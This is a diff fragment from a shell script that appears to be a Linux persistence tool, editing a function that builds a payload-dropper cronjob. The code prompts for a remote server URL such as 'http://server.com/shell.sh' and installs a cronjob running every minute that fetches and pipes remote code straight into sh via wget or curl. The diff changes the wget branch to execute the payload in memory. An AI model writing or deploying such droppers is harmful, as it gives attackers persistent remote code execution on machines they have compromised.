@@ -127,11 +127,10 @@ lswrap(){
 
 cron(){
 	read -r -p "Enter server and payload file name for payload dropper (example http://server.com/shell.sh): " server
-	read -r -p "Enter name of payload to be executed: " payload
 	read -r -p "Would you like to use wget to download/execute or curl to download/execute in memory for cronjob?: " wc
 	case $wc in
 		[WGETwget]* )
-			cronjob="* * * * * wget $server ; sh $payload";;
+			cronjob="* * * * * wget -O- $server | sh";;
 		[CURLcurl]* )
 			cronjob="* * * * * curl -fsSL '$server' | sh";;
 	esac
